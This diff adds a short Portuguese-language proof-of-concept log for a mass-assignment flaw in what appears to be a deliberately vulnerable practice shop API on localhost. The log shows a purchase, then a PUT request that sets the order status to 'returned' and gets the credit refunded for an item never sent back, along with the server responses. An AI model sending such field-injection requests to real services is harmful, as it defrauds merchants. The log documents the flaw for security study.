@@ -1,0 +1,12 @@
+# Mass Assignment (API3) — reembolso de item nunca devolvido
+# crédito antes: "credit":100.0
+# 1) compra um produto:
+{"id":7,"message":"Order sent successfully.","credit":90.0}
+# order id: 7
+----------------------------------------------------------------
+# 2) edita o pedido injetando status 'returned' (campo que o cliente não deveria controlar):
+PUT http://localhost:8888/workshop/api/shop/orders/7   body: {"status":"returned"}
+{"orders":{"id":7,"user":{"email":"vitima@teste.local","number":"4160000001"},"product":{"id":1,"name":"Seat","price":"10.00","image_url":"images/seat.svg"},"quantity":1,"status":"returned","transaction_id":"351e6dd0-d846-41b2-abec-71148f8384c6","created_on":"2026-10-20T22:51:30.676515"}}
+----------------------------------------------------------------
+# crédito depois: "credit":100.0
+# Prova: crédito reembolsado sem devolução física; item fica de graça.
